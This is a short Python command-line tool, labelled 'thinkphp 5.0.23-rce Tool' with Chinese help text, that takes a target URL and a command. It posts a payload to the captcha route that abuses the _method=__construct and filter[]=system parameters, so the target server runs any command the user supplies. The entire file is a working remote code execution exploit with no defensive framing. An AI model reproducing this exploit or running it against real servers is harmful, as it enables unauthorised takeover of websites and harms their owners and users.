import requests
import argparse

header = {
    'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
}
def send_data(url,payload):
    response = requests.post(headers=header,url=url,data=payload)
    if response.status_code == 200:
        return response.text
    else:
        return f"Request failed with status code: {response.status_code}"

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='thinkphp 5.0.23-rce Tool')

    parser.add_argument('-u', '--url', help='目标URL')
    parser.add_argument('-c', '--command',type=str,help='执行的远程命令')

    args = parser.parse_args()
    url = args.url
    command = args.command
    urlpaylod = url + '/index.php?s=captcha'
    bodypayload = f"_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]={command}"
    send_data(urlpaylod,bodypayload)